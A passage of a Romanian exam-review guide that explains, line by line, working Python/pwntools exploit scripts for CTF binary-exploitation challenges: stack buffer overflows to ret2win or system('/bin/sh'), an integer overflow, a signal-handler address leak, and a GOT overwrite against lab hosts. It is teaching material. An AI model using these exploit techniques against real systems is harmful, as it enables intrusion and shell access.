@@ -1,0 +1,2565 @@
+===============================================================================
+EXPLICAȚIE LINIE CU LINIE A EXPLOITURILOR PYTHON - TOATE CELE 22 CTF-URI
+Material de revizuire rapidă pentru examen (Exploatare Binară / SI)
+===============================================================================
+
+Cum se citește acest document: pentru fiecare challenge ai (a) titlul si
+categoria vulnerabilității, (b) un rezumat de context, (c) codul Python FINAL
+care a obținut flagul, reprodus exact, și (d) explicația liniei imediat sub
+fiecare bloc de cod. Toate adresele, offset-urile și denumirile de variabile
+sunt cele din scripturile ei reale, găsite prin checksec/Ghidra/gdb/objdump.
+
+-------------------------------------------------------------------------------
+INDEX (22 challenge-uri, ordonate de la simplu la complex)
+-------------------------------------------------------------------------------
+ 1. simple_bof        - BOF clasic 32-bit -> apel direct la system@plt("/bin/sh")
+ 2. little_boy        - BOF clasic 32-bit -> ret2win
+ 3. little_win        - BOF clasic 64-bit -> ret2win (cu gadget de aliniere)
+ 4. new_overleaf      - integer overflow (semn) pe un contor -> ret2win automat
+ 5. signal_to_nowhere - leak de adresă prin SIGSEGV + handler -> ret2win 64-bit
+ 6. model_activ       - BOF condiționat de un contor ("milestone") -> ret2win 32-bit
+ 7. marathon          - leak caracter-cu-caracter prin apeluri înlănțuite -> parolă
+ 8. Lucky_Charm       - scriere arbitrară de 2 octeți în GOT (primitivă custom)
+ 9. runner            - format string cu scriere parțială %hn -> GOT/hook overwrite
+10. barbut            - bruteforce PRNG (srand/rand din libc, replicat local)
+11. better_format     - format string, LEAK (citire) de date de pe stivă
+12. casino            - format string, SCRIERE (write) cu %n peste o variabilă
+13. tamrof_dab        - format string, LEAK direct al flagului din memorie
+14. encryptor         - BOF care suprascrie cheia XOR -> decriptare "gratuită"
+15. migratory_bird_x32- leak canary (format string) + BOF -> ret2win 32-bit
+16. migratory_bird_x64- leak canary (format string) + BOF -> ret2win 64-bit
+17. the_old_curse     - leak PIE + leak canary (format string) -> ret2win 32-bit PIE
+18. echidistant       - ret2libc 32-bit, identificare libc remote via libc.rip
+19. classic           - ret2libc clasic 2 etape, 64-bit (leak puts -> system)
+20. not_classic       - ret2libc 2 etape, 64-bit (variantă cu reintrare în funcție)
+21. las_vegas         - ret2libc 2 etape, 64-bit (leak printat cu coduri ANSI)
+22. chain_reaction    - ROP chain cu argumente + shellcode executat pe stivă (RWX)
+
+BONUS: love_life - leak canary prin format string + ret2libc în 2 etape
+       (soluție nouă, NETESTATĂ încă pe laborator - vezi secțiunea finală)
+
+===============================================================================
+1. simple_bof — BUFFER OVERFLOW CLASIC -> APEL DIRECT system@plt("/bin/sh")
+===============================================================================
+--- Context ---
+Binar 32-bit, No canary, NX enabled, No PIE. Programul citește input intr-un
+buffer cu o funcție nesigură (gets/scanf fără limită) și are PLT-ul lui
+system() disponibil (biblioteca e linkată dinamic și system e deja folosit
+undeva in binar). Nu există funcție "win"; se construiește direct apelul
+system("/bin/sh") ca un mini-ROP de 3 valori: gadget de aliniere, adresa
+system@plt, adresa literalului "/bin/sh" aflat deja în binar (secțiunea .rodata).
+
+--- Cod final (exploit_simple_bof_3.py) ---
+from pwn import *
+
+context.log_level = 'info'
+context.arch = 'i386'
+
+HOST = "10.213.0.102"
+PORT = 55638
+
+LOCAL = False   # True = testeaza local (./simple_bof), False = conectare remote
+
+RET_GADGET = 0x080491be
+SYSTEM_PLT = 0x08049060
+
+BINSH_ADDR = 0x0804a00e
+
+OFFSET = 0x48 + 4
+
+payload = b"A" * OFFSET + p32(RET_GADGET) + p32(SYSTEM_PLT) + p32(SYSTEM_PLT) + p32(BINSH_ADDR)
+
+log.info(f"Offset pana la adresa de return: {OFFSET}")
+log.info(f"Payload total: {payload!r} ({len(payload)} octeti)")
+
+if LOCAL:
+    p = process('./simple_bof')
+else:
+    p = remote(HOST, PORT)
+
+p.recvuntil(b"please!")
+p.sendline(payload)
+
+p.interactive()
+
+--- Explicație linie cu linie ---
+context.log_level = 'info'
+  Setează nivelul de logging al pwntools să arate mesaje [*] informative
+  (log.info), fără debug complet.
+
+context.arch = 'i386'
+  Spune lui pwntools că binarul e pe 32 de biti, ca funcțiile p32()/u32() să
+  împacheteze corect pe 4 octeți little-endian.
+
+HOST / PORT
+  Adresa și portul instanței Docker a challenge-ului.
+
+LOCAL = False
+  Comutator: daca e True, ruleaza binarul local cu process() pentru testare
+  rapidă fără rețea; daca e False, se conectează remote().
+
+RET_GADGET = 0x080491be
+  Adresa unui gadget "ret" simplu, găsit în binar (de obicei un ret rămas
+  dintr-o funcție). E necesar pentru alinierea stivei la 16 octeți înainte
+  de apelul system() - pe x86 ESP trebuie sa fie aliniat corect, altfel
+  system() poate crăpa intern la prima instrucțiune care folosește SSE/aliniere.
+
+SYSTEM_PLT = 0x08049060
+  Adresa intrării din PLT (Procedure Linkage Table) pentru system(). Apelând
+  aici in loc de adresa reală din libc, profităm de faptul că PLT rezolvă
+  automat adresa reală prin GOT, fără să avem nevoie de leak de libc (nu avem
+  PIE, deci PLT e la adresă fixă).
+
+BINSH_ADDR = 0x0804a00e
+  Adresa unui șir "/bin/sh" deja prezent în memoria binarului (găsit cu
+  strings/objdump în .rodata). Nu trebuie să trimitem noi acest string -
+  folosim unul deja existent, ca argument pentru system().
+
+OFFSET = 0x48 + 4
+  0x48 (72 zecimal) e distanța până la saved ebp/variabile locale + 4 octeți
+  pentru saved ebp propriu-zis, calculată din prologul funcției vulnerabile
+  (push ebp; sub esp, N). Totalul e distanța exactă până la adresa de retur
+  de pe stivă.
+
+payload = b"A" * OFFSET + p32(RET_GADGET) + p32(SYSTEM_PLT) + p32(SYSTEM_PLT) + p32(BINSH_ADDR)
+  Structura exactă a stivei falsificate, in ordinea in care CPU-ul le va
+  "pop"-ui ca adrese de retur succesive:
+    - OFFSET octeti de "A": umplutura, suprascrie bufferul si variabilele
+      locale fara sa ne intereseze continutul lor.
+    - RET_GADGET: prima "adresa de retur" - functia vulnerabila face ret
+      aici, ceea ce doar aliniaza stiva (ret-ul aduce ESP cu 4, exact cat
+      trebuie pentru aliniere pe 16).
+    - SYSTEM_PLT (prima aparitie): aici CPU "sare" efectiv in system@plt.
+    - SYSTEM_PLT (a doua aparitie): dupa ce system@plt executa "call" catre
+      system() real, system() la randul lui va face "ret" - iar aceasta a
+      doua valoare joaca rolul adresei de retur a lui system(), care in mod
+      normal ar fi adresa apelantului. Aici o punem tot pe SYSTEM_PLT doar
+      ca sa nu crape (nu ne intereseaza ce se intampla DUPA system(), fiindca
+      vom avea deja un shell interactiv).
+    - BINSH_ADDR: acesta e PRIMUL ARGUMENT citit de system() de pe stiva (in
+      conventia cdecl pe 32-bit, argumentele functiei apelate stau IMEDIAT
+      dupa adresa ei de retur pe stiva). Deci system() primeste ca argument
+      adresa sirului "/bin/sh" si executa efectiv un shell.
+
+p.recvuntil(b"please!")
+  Asteapta promptul binarului (ex: "Enter the magic word, please!") inainte
+  de a trimite payload-ul, ca sa fim siguri ca programul e la punctul unde
+  citeste inputul vulnerabil.
+
+p.sendline(payload)
+  Trimite payload-ul construit mai sus, declansand overflow-ul.
+
+p.interactive()
+  Trece conexiunea in mod interactiv: de aici putem scrie direct comenzi
+  shell (ex: cat flag.txt), fiindca system("/bin/sh") a deschis un shell pe
+  celalalt capat al socket-ului.
+
+
+===============================================================================
+2. little_boy — BUFFER OVERFLOW CLASIC -> RET2WIN (32-bit)
+===============================================================================
+--- Context ---
+Binar 32-bit, not stripped. main() apeleaza printer(), care face
+scanf("%s", local_2c) intr-un buffer de 36 octeti FARA limita de lungime -
+clasicul buffer overflow. Exista o functie win() care citeste si afiseaza
+flag.txt, dar nu e apelata nicaieri in cod -> trebuie sa redirectionam
+executia catre ea suprascriind adresa de retur a lui printer().
+
+--- Cod final (exploit.py) ---
+#!/usr/bin/env python3
+
+import socket
+import struct
+import sys
+import time
+
+HOST = "10.213.0.102" #ip host
+PORT = 48758
+WIN_ADDR = 0x080491b6
+OFFSET = 44 # 36 + 4 + 4 = 44  | 36 oct - buffer, 4 pt ebx si 4 pt ebp
+
+
+def main():
+    payload = b"A" * OFFSET + struct.pack("<I", WIN_ADDR)
+
+    print(f"[*] Ma conectez la {HOST}:{PORT} ...")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(5)
+    s.connect((HOST, PORT))
+
+    try:
+        banner = s.recv(4096)
+        print("[*] Server a trimis:")
+        print(banner.decode(errors="replace"))
+    except socket.timeout:
+        pass
+
+    print(f"[*] Trimit payload-ul ({len(payload)} octeti)...")
+    s.sendall(payload + b"\n")
+
+    time.sleep(1)
+
+    try:
+        response = s.recv(4096)
+        print("[*] Raspuns de la server (aici ar trebui sa fie flag-ul):")
+        print(response.decode(errors="replace"))
+    except socket.timeout:
+        print("[!] Nu am primit raspuns la timp.")
+
+    s.close()
+
+if __name__ == "__main__":
+    main()
+
+--- Explicație linie cu linie ---
+import socket / struct / sys / time
+  Aici nu se foloseste pwntools, ci socket-uri TCP brute din Python standard
+  si struct pentru impachetarea adreselor (alternativa manuala la p32()).
+
+WIN_ADDR = 0x080491b6
+  Adresa de start a functiei win(), vazuta direct in Ghidra. Binarul nu are
+  PIE, deci adresa e fixa la fiecare rulare.
+
+OFFSET = 44 # 36 + 4 + 4
+  36 = marimea bufferului local_2c din printer(). Prologul functiei e
+  push ebp; mov ebp, esp; push ebx; sub esp, 0x24 - asta inseamna ca pe
+  stiva, intre buffer si adresa de retur, mai sunt salvate inca 8 octeti:
+  4 pentru ebx (registru salvat explicit) si 4 pentru ebp-ul vechi al
+  apelantului. Deci 36 + 4 + 4 = 44 octeti trebuie scrisi inainte sa
+  ajungem exact la adresa de retur.
+
+payload = b"A" * OFFSET + struct.pack("<I", WIN_ADDR)
+  struct.pack("<I", WIN_ADDR) impacheteaza adresa pe 4 octeti, little-endian
+  ("<" = little-endian, "I" = unsigned int pe 4 octeti) - echivalentul lui
+  p32(WIN_ADDR) din pwntools. Payload-ul final: 44 octeti umplutura (care
+  umple bufferul + ebx + ebp salvati) urmati EXACT de adresa lui win(),
+  care va fi citita de CPU ca fiind noua adresa de retur cand printer()
+  face "ret".
+
+s = socket.socket(...); s.connect((HOST, PORT))
+  Deschide manual o conexiune TCP, echivalentul lui remote() din pwntools.
+
+banner = s.recv(4096)
+  Citeste mesajul initial trimis de server (ex: "Insert your message to the
+  world"), ca sa confirmam ca programul asteapta input.
+
+s.sendall(payload + b"\n")
+  Trimite payload-ul complet, cu "\n" la final fiindca scanf("%s") se
+  opreste la whitespace/newline - "\n" marcheaza finalul inputului citit.
+
+time.sleep(1)
+  Pauza mica, sa dam timp serverului sa proceseze overflow-ul, sa execute
+  win() si sa trimita inapoi continutul flag.txt, inainte sa citim raspunsul.
+
+response = s.recv(4096); print(...)
+  Citeste si afiseaza raspunsul final - aici apare flagul tiparit de win().
+
+
+===============================================================================
+3. little_win — BUFFER OVERFLOW CLASIC -> RET2WIN (64-bit, cu aliniere stivă)
+===============================================================================
+--- Context ---
+Aceeasi idee ca little_boy, dar pe 64-bit: buffer de 64 octeti + 8 octeti
+rbp salvat, fara canary. Pe 64-bit, apelurile de functii din libc (chiar si
+indirect, prin orice cod ce foloseste instructiuni SSE in prolog) cer ca
+RSP sa fie aliniat la 16 octeti in momentul call-ului; de aceea se introduce
+un gadget "ret" suplimentar inainte de adresa reala a lui win(), ca sa
+"consume" cei 8 octeti care ar strica alinierea.
+
+--- Cod final (little_win.py) ---
+from pwn import *
+
+p = remote("10.213.0.102", 58500)
+
+print(p.recv())
+
+OFFSET = 72  # 64 (buffer) + 8 (rbp salvat)
+RET = p64(0x401016)  # gadget de aliniere a stivei -> ret
+WIN = p64(0x401156)  # adresa lui win, din nm/objdump
+
+payload = b"A" * OFFSET + RET + WIN
+print(f"Payload trimis: {payload}")
+
+p.sendline(payload)
+print(p.recv())
+
+p.interactive()
+
+--- Explicație linie cu linie ---
+p = remote("10.213.0.102", 58500)
+  Deschide conexiunea TCP catre instanta Docker.
+
+print(p.recv())
+  Citeste si afiseaza primul mesaj trimis de server (promptul initial),
+  util pentru debugging/verificare ca binarul e la stadiul asteptat.
+
+OFFSET = 72  # 64 (buffer) + 8 (rbp salvat)
+  Pe 64-bit, bufferul local are 64 octeti, iar imediat dupa el (in jos pe
+  stiva) sunt cei 8 octeti ai saved rbp. 64 + 8 = 72 este distanta exacta
+  pana la adresa de retur.
+
+RET = p64(0x401016)  # gadget de aliniere
+  O singura instructiune "ret" gasita in binar la aceasta adresa. Cand
+  functia vulnerabila face "ret" normal, CPU-ul "sare" la aceasta adresa,
+  care la randul ei face IMEDIAT un alt "ret" - asta consuma inca 8 octeti
+  de pe stiva (following value), aducand RSP la un multiplu de 16 EXACT in
+  momentul in care se executa urmatorul call catre win()/system()/etc.
+  Fara acest gadget, apelul ar putea crapa din cauza instructiunilor cu
+  aliniere stricta (ex. movaps) din codul biblioteca legat la win().
+
+WIN = p64(0x401156)  # adresa lui win()
+  Adresa reala a functiei win(), gasita static cu nm/objdump (binarul nu
+  are PIE).
+
+payload = b"A" * OFFSET + RET + WIN
+  72 octeti umplutura (buffer + rbp) + gadgetul RET (devine prima adresa de
+  retur, aliniaza stiva) + adresa lui WIN (devine a doua adresa de retur,
+  efectiv acolo sare executia dupa ce RET-ul "consuma" el insusi din stiva).
+
+p.sendline(payload)
+  Trimite payload-ul, declansand overflow-ul si, in cascada, apelul la
+  win().
+
+p.interactive()
+  Trece in mod interactiv ca sa vedem/citim flagul tiparit de win().
+
+
+===============================================================================
+4. new_overleaf — INTEGER OVERFLOW (SEMN) PE UN CONTOR -> RET2WIN AUTOMAT
+===============================================================================
+--- Context ---
+Programul tine un contor semnat (int, pe 32 de biti) care se incrementeaza
+la fiecare iteratie ("Let's count to the infinity"). Codul C are probabil o
+verificare de tipul "if (contor < 0) win();" undeva in bucla, dar contorul
+normal nu ajunge niciodata negativ in timp util. Vulnerabilitatea: putem
+scrie DIRECT, printr-un buffer overflow pe stiva, valoarea contorului,
+punand 0x7FFFFFFF (cel mai mare int pozitiv pe 32 de biti). La urmatoarea
+incrementare normala din program (contor += 1), valoarea face "overflow de
+semn" si devine 0x80000000, care in reprezentare signed e NEGATIV -> se
+declanseaza automat ramura care apeleaza win().
+
+--- Cod final (overlean.py) ---
+from pwn import *
+
+p = remote("10.213.0.102", 39394)
+
+OFFSET = 16  # dist de la inceputul bufferului (ebp - 0x1c) pana la contor(ebp- 0xc)
+
+payload = b"A" * OFFSET + p32(0x7FFFFFFF)
+
+print(p.recv())          # "Let's count to the infinity"
+p.sendline(payload)
+
+print(p.recvall(timeout=3).decode(errors="replace"))
+
+--- Explicație linie cu linie ---
+OFFSET = 16
+  Distanta pe stiva intre inceputul bufferului vulnerabil (ebp-0x1c in
+  decompilare) si variabila contor (ebp-0xc): 0x1c - 0xc = 0x10 = 16 octeti.
+  Trebuie sa "umplem" exact acesti 16 octeti de buffer ca urmatorii 4 octeti
+  pe care ii scriem sa cada EXACT peste variabila contor, nu peste altceva.
+
+payload = b"A" * OFFSET + p32(0x7FFFFFFF)
+  16 octeti de umplutura (nu ne intereseaza continutul bufferului propriu-zis)
+  urmati de p32(0x7FFFFFFF) - valoarea maxima pozitiva reprezentabila pe un
+  int semnat de 32 biti (0111...1 in binar). Scriem aceasta valoare direct
+  peste variabila contor de pe stiva.
+
+print(p.recv())
+  Citeste mesajul initial al binarului, de confirmare ca asteapta input.
+
+p.sendline(payload)
+  Trimite payload-ul; overflow-ul suprascrie contorul cu 0x7FFFFFFF.
+
+print(p.recvall(timeout=3).decode(errors="replace"))
+  Dupa trimitere, programul face (undeva in bucla normala) contor += 1.
+  0x7FFFFFFF + 1 = 0x80000000, care citit ca int SEMNAT e numarul negativ
+  cel mai mic posibil (INT_MIN) - overflow aritmetic clasic de semn. Codul
+  binarului verifica probabil "if (contor < 0)" si apeleaza automat win(),
+  fara sa fie nevoie sa controlam vreo adresa de retur. recvall() citeste
+  tot ce trimite serverul dupa asta, inclusiv flagul.
+
+
+===============================================================================
+5. signal_to_nowhere — LEAK PRIN SIGSEGV + SIGNAL HANDLER -> RET2WIN (64-bit)
+===============================================================================
+--- Context ---
+Binarul are PIE activat (adrese aleatoare la fiecare rulare), dar instaleaza
+un signal handler pentru SIGSEGV (sig_handler) care, la crash, afiseaza
+adresa reala a functiei win() inainte sa continue executia ("make_a_wish").
+Strategia: declansam intentionat un crash controlat (scriem o adresa de
+retur invalida), citim leak-ul afisat de handler, apoi facem un AL DOILEA
+overflow, de aceasta data cu adresa REALA a lui win() (calculata din leak).
+
+--- Cod final (runner.py din signal_to_nowhere) ---
+from pwn import *
+
+p = remote("10.213.0.102", 42785)
+
+OFFSET = 136 # 128 (buffer) + 8 (rbp salvat)
+
+# runda 1: declansam un crash controlat, ca sa primim leak-ul
+print(p.recv()) # mesajul initial din make_a_wish
+
+payload1 = b"A" * OFFSET + b"B" * 8 # "B"*8 = adresa invalida, orice doar sa crape
+p.sendline(payload1)
+
+raspuns = p.recvuntil(b"gift: ")
+print(f"Raspuns dupa crash: {raspuns}")
+
+leak_line = p.recvline().strip()
+print(f"Linia cu leak-ul: {leak_line}")
+
+win_addr = int(leak_line, 16)
+log.info(f"Adresa reala a lui win: {hex(win_addr)}")
+
+# runda 2: suprascriem cu adresa realu a lui win
+print(p.recv()) # al doilea mesaj din make_a_wish (apelat din sig_handler)
+
+payload2 = b"A" * OFFSET + p64(win_addr)
+p.sendline(payload2)
+
+p.interactive()
+
+--- Explicație linie cu linie ---
+OFFSET = 136 # 128 (buffer) + 8 (rbp salvat)
+  Buffer de 128 octeti in make_a_wish() + 8 octeti rbp salvat = 136 octeti
+  pana la adresa de retur pe 64-bit.
+
+payload1 = b"A" * OFFSET + b"B" * 8
+  Primul payload NU incearca sa sara nicaieri folositor - scrie dupa adresa
+  de retur 8 octeti de "B" (0x4242424242424242), o adresa evident invalida.
+  Scopul e strict sa PROVOACE un SIGSEGV cand functia face "ret" si CPU-ul
+  incearca sa execute la adresa invalida.
+
+p.sendline(payload1)
+  Trimite payload-ul care va provoca crash-ul controlat.
+
+raspuns = p.recvuntil(b"gift: ")
+  La SIGSEGV, kernelul apeleaza sig_handler-ul instalat de program (nu
+  termina procesul brusc), iar acest handler tipareste un mesaj care se
+  termina cu "gift: " urmat de adresa reala (in memorie, cu PIE activ) a
+  lui win(). recvuntil citeste tot pana la acel marker.
+
+leak_line = p.recvline().strip(); win_addr = int(leak_line, 16)
+  Linia imediat urmatoare contine adresa in hexazecimal - o convertim la
+  intreg. Aceasta e adresa REALA a lui win() in aceasta rulare (cu PIE,
+  adresa difera de la o executie la alta, dar handler-ul ne-o da gratuit).
+
+print(p.recv())
+  Dupa ce a gestionat semnalul, sig_handler apeleaza din nou make_a_wish(),
+  care tipareste al doilea prompt - il citim ca sa sincronizam fluxul.
+
+payload2 = b"A" * OFFSET + p64(win_addr)
+  Acelasi offset de umplutura, dar acum scriem ca adresa de retur VALOAREA
+  REALA a lui win(), leakata mai sus (nu mai e un crash, e un salt controlat).
+
+p.sendline(payload2)
+  Trimite al doilea payload; functia face "ret" direct in win().
+
+p.interactive()
+  Mod interactiv pentru a citi flagul afisat de win().
+
+
+===============================================================================
+6. model_activ — BUFFER OVERFLOW CONDIȚIONAT DE UN CONTOR -> RET2WIN (32-bit)
+===============================================================================
+--- Context ---
+Programul cere repetat "Enter your lucky number" si compara inputul cu o
+valoare interna. Raspunsul corect ("1") incrementeaza un contor/milestone pe
+server. Abia dupa ce contorul atinge un prag (aici: 9 raspunsuri corecte),
+drumul de cod care proceseaza inputul permite si un buffer overflow real pe
+cei 12 octeti suplimentari pana la adresa de retur, pe care o suprascriem
+cu address_return - o rutina care tipareste flagul.
+
+--- Cod final (model_active.py) ---
+from pwn import *
+
+p = remote("10.213.0.102", 42277)
+
+print(p.recv())
+
+address_return = 0x080491d6
+
+payload = b'1' + b"\x00" + 30 * b'A' + p32(0x00) + p32(0x01)
+print(f"Payload to send {payload}")
+for _ in range(1,10):
+	p.sendline(payload)
+	print(p.recv())
+
+payload += 12 * b'A' +p32(address_return)
+
+p.sendline(payload)
+print(p.recv())
+
+#p.interactive()
+
+--- Explicație linie cu linie ---
+address_return = 0x080491d6
+  Adresa catre care vrem sa redirectionam executia odata ce depasim cei
+  12 octeti ramasi pana la adresa de retur - gasita static (binarul nu are
+  PIE), corespunde functiei care tipareste flagul.
+
+payload = b'1' + b"\x00" + 30 * b'A' + p32(0x00) + p32(0x01)
+  Structura unui raspuns "valid" pentru program:
+    - b'1' + b"\x00": raspunsul propriu-zis la "lucky number" - caracterul
+      "1" urmat de terminatorul de string, asa cum il citeste scanf("%s")
+      sau echivalent.
+    - 30 * b'A': umplutura pana la restul campurilor de pe stiva, fara sa
+      ne intereseze continutul.
+    - p32(0x00) + p32(0x01): doua valori numerice de 4 octeti fiecare,
+      scrise peste doua variabile/flaguri interne de pe stiva (probabil un
+      flag "gresit"=0 si un flag "corect"=1), astfel incat verificarea
+      interna a programului sa confirme raspunsul ca fiind corect de fiecare
+      data, indiferent de randomizarea reala a "numarului norocos".
+
+for _ in range(1,10): p.sendline(payload); print(p.recv())
+  Trimite ACELASI payload de 9 ori la rand. De fiecare data serverul
+  raspunde "You got it" si, intern, incrementeaza contorul/milestone-ul de
+  raspunsuri corecte. Acest numar de 9 repetari a fost determinat empiric,
+  observand ca flagul apare abia dupa al 9-lea succes.
+
+payload += 12 * b'A' + p32(address_return)
+  La payload-ul deja validat (care trece verificarile de mai sus) se
+  adauga ALTI 12 octeti de umplutura (pentru restul variabilelor de pe
+  stiva/saved registers) urmati de address_return. Lungimea totala a
+  acestui payload e cea care ajunge, de aceasta data, suficient de departe
+  pe stiva ca sa suprascrie EFECTIV adresa de retur.
+
+p.sendline(payload); print(p.recv())
+  Trimite payload-ul extins - fiind trimis dupa ce contorul a atins deja
+  pragul necesar (9), overflow-ul real este acum acceptat/procesat de
+  program, iar "ret"-ul sare in address_return, care tipareste flagul.
+
+
+===============================================================================
+7. marathon — LEAK CARACTER-CU-CARACTER PRIN APELURI ÎNLĂNȚUITE
+===============================================================================
+--- Context ---
+Meniul binarului ofera o functie marathon() cu buffer vulnerabil la BOF.
+Exista o functie milestone_prize() care, apelata repetat, tipareste cate un
+caracter din parola interna de fiecare data (efect de genul "Km N: <car>").
+Strategia: nu facem ret2win direct, ci construim pe stiva un LANT de 18
+apeluri succesive la milestone_prize() (cate caractere are parola), urmat
+de un salt inapoi in menu(), ca programul sa ramana viu si sa putem trimite
+parola gasita la pasul 2 (verificarea propriu-zisa a parolei).
+
+--- Cod final (marathon.py) ---
+from pwn import *
+import re
+
+HOST = "10.213.0.102"
+PORT = 38453   # actualizeaza portul la tine
+
+MILESTONE_PRIZE = 0x080492d6
+MENU = 0x080493d7
+OFFSET = 44
+NUM_CHARS = 18  # generate_password(0x12) -> 0x12 <=> 18
+
+p = remote(HOST, PORT)
+
+# alegem optiunea 1 -> marathon()
+p.recvuntil(b": ")
+p.sendline(b"1")
+p.recvuntil(b"start?")
+
+payload = b"A" * OFFSET + p32(MILESTONE_PRIZE) * NUM_CHARS + p32(MENU)
+# lantuim 18 apeluri la milestone_prize(), apoi revenim in menu()
+
+p.sendline(payload)
+
+parola = {}
+while len(parola) < NUM_CHARS:
+    linie = p.recvline(timeout=3).decode(errors="replace").strip()
+    if not linie:
+        continue
+    m = re.match(r"Km (\d+): (.)", linie)
+    if m:
+        parola[int(m.group(1))] = m.group(2)
+    print(f"[*] {linie}")
+
+parola_completa = "".join(parola[i] for i in sorted(parola))
+print(f"\n[+] Parola reconstruita: {parola_completa}")
+
+# acum suntem inapoi in menu() -> alegem 2 si trimitem parola gasita
+p.recvuntil(b": ")
+p.sendline(b"2")
+p.recvuntil(b"password: ")
+p.sendline(parola_completa.encode())
+
+print(p.recvall(timeout=3).decode(errors="replace"))
+
+--- Explicație linie cu linie ---
+MILESTONE_PRIZE = 0x080492d6
+  Adresa functiei milestone_prize(), care tipareste un caracter din parola
+  interna la fiecare apel (incrementand probabil un index static intern de
+  fiecare data cand e apelata).
+
+MENU = 0x080493d7
+  Adresa functiei menu() - unde dorim sa revenim dupa ce am "stors" toate
+  caracterele, ca programul sa nu crape si sa putem continua interactiv.
+
+OFFSET = 44
+  Distanta pana la adresa de retur in marathon(), calculata la fel ca la
+  little_boy (buffer + registre salvate).
+
+NUM_CHARS = 18
+  Numarul de caractere al parolei generate intern, deductibil din apelul
+  generate_password(0x12) observat in disasamblare (0x12 hex = 18 zecimal).
+
+payload = b"A" * OFFSET + p32(MILESTONE_PRIZE) * NUM_CHARS + p32(MENU)
+  Aceasta e cheia trucului de "ret2func inlantuit fara argumente": pe
+  32-bit, o functie fara argumente care NU modifica stiva (doar tipareste
+  si face ret) poate fi apelata repetat scriind adresa ei de NUM_CHARS ori
+  la rand pe stiva, in locul adreselor de retur succesive. Fiecare "ret" al
+  lui milestone_prize() preia urmatoarea valoare de pe stiva ca noua adresa
+  de retur, care e din nou milestone_prize(), si asa de 18 ori - de fiecare
+  data tiparind urmatorul caracter din parola. Dupa cele 18 repetari, ultima
+  valoare de pe stiva e MENU, deci executia revine in meniul principal in
+  loc sa crape.
+
+while len(parola) < NUM_CHARS: ... re.match(r"Km (\d+): (.)", linie)
+  Citeste liniile de output una cate una si extrage, cu o expresie regulata,
+  numarul kilometrului ("Km N") si caracterul asociat, punandu-le intr-un
+  dictionar indexat (parola[N] = caracter), ca sa nu depindem de ORDINEA in
+  care sosesc liniile.
+
+parola_completa = "".join(parola[i] for i in sorted(parola))
+  Reconstruieste parola in ordinea corecta a indicilor (0, 1, 2, ...18),
+  concatenand caracterele colectate.
+
+p.sendline(b"2"); p.sendline(parola_completa.encode())
+  Dupa ce am revenit in menu() (garantat de salt-ul catre MENU din payload),
+  alegem opțiunea 2 (verificare parola) si trimitem parola reconstruita -
+  programul confirma parola si tipareste flagul.
+
+
+===============================================================================
+8. Lucky_Charm (talisman) — SCRIERE ARBITRARĂ DE 2 OCTEȚI ÎN GOT
+===============================================================================
+--- Context ---
+checksec: Partial RELRO (GOT scriptibil), Canary found (dar nu-l atingem),
+No PIE. Binarul expune o "primitivă" custom: la promptul ">>" primeste un
+index, apoi la promptul "Spell:" scrie 2 octeti EXACT la adresa
+talis + index*8 (talis e o variabila globala de tip array de pointeri de
+8 octeti fiecare, aflata in .data). Alegand un index NEGATIV, putem scrie
+inapoi, peste exit@GOT, fara niciun overflow pe stiva - e o scriere
+arbitrara controlata direct de program.
+
+--- Cod final (talisman.py) ---
+from pwn import *
+import struct
+
+context.log_level = 'info'
+context.arch = 'amd64'
+
+HOST = "10.213.0.102"
+PORT = 36287
+LOCAL = False # True ## sa se faca pt fisier local
+
+TALIS_ADDR    = 0x4040a0
+GOT_EXIT_ADDR = 0x404080
+READ_FLAG     = 0x40135a
+
+index = (GOT_EXIT_ADDR - TALIS_ADDR) // 8
+log.info(f"index calculat: {index}")   # ar trebui sa arate -4
+
+low_bytes = struct.pack("<H", READ_FLAG & 0xffff)
+log.info(f"octetii de scris: {low_bytes!r}")   # ar trebui sa arate b'Z\\x13' (0x5a, 0x13)
+
+p = process('./talisman') if LOCAL else remote(HOST, PORT)
+p.recvuntil(b">> ")
+p.sendline(str(index).encode())
+p.recvuntil(b"Spell: ")
+p.send(low_bytes)
+p.interactive()
+
+--- Explicație linie cu linie ---
+TALIS_ADDR = 0x4040a0
+  Adresa variabilei globale "talis" (gasita cu nm: "D talis"), un array ale
+  carui elemente sunt indexate de program la 8 octeti distanta unul de altul
+  (ca niste pointeri pe 64-bit).
+
+GOT_EXIT_ADDR = 0x404080
+  Adresa intrarii din GOT pentru exit() (gasita cu
+  objdump -R | grep exit -> R_X86_64_JUMP_SLOT exit@GLIBC_2.2.5). Fiindca
+  RELRO e doar Partial, aceasta intrare e inca scriptibila la runtime.
+
+READ_FLAG = 0x40135a
+  Adresa functiei read_flag(), care citeste si afiseaza flagul (gasita cu
+  gdb: print &read_flag).
+
+index = (GOT_EXIT_ADDR - TALIS_ADDR) // 8
+  Programul scrie la adresa (TALIS_ADDR + index*8). Pentru a ajunge EXACT
+  la GOT_EXIT_ADDR, rezolvam ecuatia: TALIS_ADDR + index*8 = GOT_EXIT_ADDR
+  => index = (GOT_EXIT_ADDR - TALIS_ADDR) / 8. Rezultatul e -4 (talis.py
+  confirma in log), adica indexam "in spate" fata de talis, exact pana la
+  exit@GOT. Impartirea intreaga functioneaza corect fiindca diferenta e
+  multiplu de 8.
+
+low_bytes = struct.pack("<H", READ_FLAG & 0xffff)
+  Primitiva programului scrie doar 2 octeti (un "half", 'H' in struct), nu
+  8 - deci putem suprascrie doar partea de JOS (cei mai putin semnificativi
+  16 biti) a valorii de la adresa tinta. READ_FLAG & 0xffff extrage acesti
+  16 biti din adresa lui read_flag(). Fiindca exit@GOT contine deja o
+  adresa in aceeasi zona de memorie (binarul nu are PIE, toate adresele
+  functiilor sunt in acelasi interval 0x40xxxx), suprascriind doar partea
+  joasa a adresei din GOT e suficient ca sa o transformam exact in adresa
+  lui read_flag() (partea de sus, 0x40, ramane neschimbata si coincide).
+
+p.sendline(str(index).encode())
+  Trimite indexul (-4) calculat mai sus, la primul prompt ">>".
+
+p.send(low_bytes)
+  Trimite cei 2 octeti calculati, la al doilea prompt "Spell:". Programul
+  ii scrie la adresa talis + index*8 = exit@GOT, suprascriind exit() cu
+  read_flag() (partial, dar suficient).
+
+p.interactive()
+  La urmatorul apel exit() din codul normal al programului, CPU-ul va
+  "sari" de fapt la read_flag(), care tipareste flagul - il vedem in modul
+  interactiv.
+
+
+===============================================================================
+9. runner — FORMAT STRING CU SCRIERE PARȚIALĂ %hn (OVERWRITE DE FUNCȚIE)
+===============================================================================
+--- Context ---
